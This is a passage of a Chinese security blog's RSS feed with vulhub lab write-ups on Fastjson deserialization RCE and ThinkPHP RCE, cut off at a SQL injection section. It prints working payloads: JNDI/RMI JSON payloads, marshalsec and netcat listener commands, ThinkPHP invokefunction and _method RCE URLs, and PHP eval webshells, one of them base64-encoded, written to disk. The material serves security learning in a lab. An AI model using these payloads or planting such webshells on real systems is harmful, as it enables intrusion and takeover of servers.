&amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后就发现已经成功进行getshell操作了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183720913.png&#34; alt=&#34;image-20240425183720913&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183748769.png&#34; alt=&#34;image-20240425183748769&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183934178.png&#34; alt=&#34;image-20240425183934178&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或利用工具进行漏洞验证&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -l tvcy5n.dnslog.cn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195446761.png&#34; alt=&#34;image-20240425195446761&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/TouchFile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/GetShell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195613834.png&#34; alt=&#34;image-20240425195613834&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-2-47-rce&#34;&gt;&lt;a href=&#34;#1-2-47-rce&#34; class=&#34;headerlink&#34; title=&#34;1.2.47-rce&#34;&gt;&lt;/a&gt;1.2.47-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-1&#34;&gt;&lt;a href=&#34;#漏洞原理：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-1&#34;&gt;&lt;a href=&#34;#漏洞复现：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;基本流程手法和上面一个漏洞基本相同，只是最后的BP发送的payload稍稍有点区别&lt;/p&gt;
&lt;p&gt;和上一个一样，先开启各项服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#GetShell&amp;quot; 9999&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202024134.png&#34; alt=&#34;image-20240425202024134&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202135914.png&#34; alt=&#34;image-20240425202135914&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202210491.png&#34; alt=&#34;image-20240425202210491&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后BP抓包，修改POST方法，修改Content-Type，修改payload发送&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 272&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;a&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/GetShell&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202527880.png&#34; alt=&#34;image-20240425202527880&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202511365.png&#34; alt=&#34;image-20240425202511365&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130100893&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130100893&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html&#34;&gt;https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/karsa/p/15983486.html&#34;&gt;https://www.cnblogs.com/karsa/p/15983486.html&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】ThinkPHP漏洞复现</title>
            <link>https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 25 Apr 2024 00:11:39 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】ThinkPHP漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】ThinkPHP漏洞复现&lt;/h1&gt;&lt;p&gt;​	PHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。&lt;br&gt;​	ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。&lt;/p&gt;
&lt;h1 id=&#34;2-rce&#34;&gt;&lt;a href=&#34;#2-rce&#34; class=&#34;headerlink&#34; title=&#34;2-rce&#34;&gt;&lt;/a&gt;2-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：&#34;&gt;&lt;a href=&#34;#漏洞原理：&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP 2.x版本中，使用&lt;code&gt;preg_replace&lt;/code&gt;的&lt;code&gt;/e&lt;/code&gt;模式匹配路由：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;@(\w+)&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;([^&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;\/]+)@e&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;$var[\&amp;#x27;\\1\&amp;#x27;]=&amp;quot;\\2&amp;quot;;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;implode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$paths&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。&lt;/p&gt;
&lt;p&gt;ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。&lt;/p&gt;
&lt;p&gt;具体原理过程参考文章：&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89&#34;&gt;https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：&#34;&gt;&lt;a href=&#34;#漏洞复现：&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;根据对漏洞原理的理解，构造payload，获取phpinfo信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;phpinfo()&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png&#34; alt=&#34;image-20240424170222558&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造payload，配合蚁剑等工具进行连接，获取shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;@print(eval($_POST[sqrt7]))&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png&#34; alt=&#34;image-20240424170623602&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png&#34; alt=&#34;image-20240424170654949&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-0-23-rce&#34;&gt;&lt;a href=&#34;#5-0-23-rce&#34; class=&#34;headerlink&#34; title=&#34;5.0.23-rce&#34;&gt;&lt;/a&gt;5.0.23-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-1&#34;&gt;&lt;a href=&#34;#漏洞原理：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行&lt;/p&gt;
&lt;p&gt; 影响版本&lt;/p&gt;
&lt;p&gt;ThinkPHP 5.0.x&lt;del&gt;5.0.23&lt;br&gt;ThinkPHP 5.1.x&lt;/del&gt;5.1.31&lt;br&gt;ThinkPHP 5.2.0beta1&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-1&#34;&gt;&lt;a href=&#34;#漏洞复现：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;BP抓包修改数据，执行命令，获取信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png&#34; alt=&#34;屏幕截图 2024-04-24 191819&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试创建后门，利用蚁剑进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;&amp;lt;?php @eval(\$_POST[sqrt7])?&amp;gt;&amp;quot; &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&amp;quot;|base64 -d &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png&#34; alt=&#34;image-20240424192934769&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-rce&#34;&gt;&lt;a href=&#34;#5-rce&#34; class=&#34;headerlink&#34; title=&#34;5-rce&#34;&gt;&lt;/a&gt;5-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-2&#34;&gt;&lt;a href=&#34;#漏洞原理：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。&lt;/p&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;ThinkPHP5:&lt;br&gt;5.0.x&lt;del&gt;5.0.23；&lt;br&gt;5.1.0&lt;/del&gt;5.1.30；&lt;br&gt;不同版本payload不同， 5.1.13之后还与debug模式有关&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-2&#34;&gt;&lt;a href=&#34;#漏洞复现：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;构造payload，执行命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=-1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png&#34; alt=&#34;image-20240424230451281&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png&#34; alt=&#34;image-20240424230509901&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试写入后门木马进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=file_put_contents&amp;amp;vars[1][]=shell.php&amp;amp;vars[1][1]=&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload解释：调用file_put_contents方法将&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;写入shell.php文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png&#34; alt=&#34;image-20240424231120979&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;in-sqlinjection&#34;&gt;&lt;a href=&#34;#in-sqlinjection&#34; class=&#34;headerlink&#34; title=&#34;in-sqlinjection&#34;&gt;&lt;/a&gt;in-sqlinjection&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-3&#34;&gt;&lt;a href=&#34;#漏洞原理：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP5 SQL注入漏洞 &amp;amp;&amp;amp; 敏感信息泄露&lt;/p&gt;
&lt;p&gt;传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。&lt;/p&gt;
&lt;p&gt;重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。&lt;/p&gt;
&lt;p&gt;影响版本&lt;br&gt;ThinkPHP &amp;lt; 5.1.23&lt;br&gt;该漏洞的形成最关键一点是需要开启debug模式&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
